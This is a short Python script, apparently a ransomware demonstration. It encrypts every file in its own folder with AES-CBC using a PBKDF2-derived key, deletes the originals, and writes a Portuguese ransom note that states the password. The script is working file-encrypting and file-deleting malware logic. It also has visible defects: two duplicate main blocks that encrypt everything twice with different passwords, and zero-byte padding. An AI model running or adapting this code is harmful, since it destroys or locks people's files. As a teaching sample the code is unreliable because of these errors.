import os
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def derive_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100_000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

def encrypt_file(file_path: str, password: str):
    salt = os.urandom(16)
    key = derive_key(password, salt)
    iv = os.urandom(16)

    with open(file_path, 'rb') as f:
        plaintext = f.read()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padded = plaintext + b"\0" * (16 - len(plaintext) % 16)
    ciphertext = encryptor.update(padded) + encryptor.finalize()

    with open(file_path + '.aes', 'wb') as f:
        f.write(salt + iv + ciphertext)

    os.remove(file_path)

def create_ransom_note(directory: str, password: str):
    note = f"""SEUS ARQUIVOS FORAM CRIPTOGRAFADOS (AES-256)!

Senha: {password}
"""
    with open(os.path.join(directory, 'RANSOM_NOTE.txt'), 'w') as f:
        f.write(note)

def simulate_ransomware(password: str = 'kkk'):
    directory = os.path.dirname(os.path.abspath(__file__))

    for file in os.listdir(directory):
        if not os.path.isfile(os.path.join(directory, file)):
            continue
        if file.endswith(('.aes', 'RANSOM_NOTE.txt')):
            continue
        if file == os.path.basename(__file__):
            continue

        file_path = os.path.join(directory, file)
        encrypt_file(file_path, password)
        print(f"Encrypted: {file}")

    create_ransom_note(directory, password)

if __name__ == "__main__":
    simulate_ransomware('kkk')
if __name__ == "__main__":
    simulate_ransomware('your_strong_password')
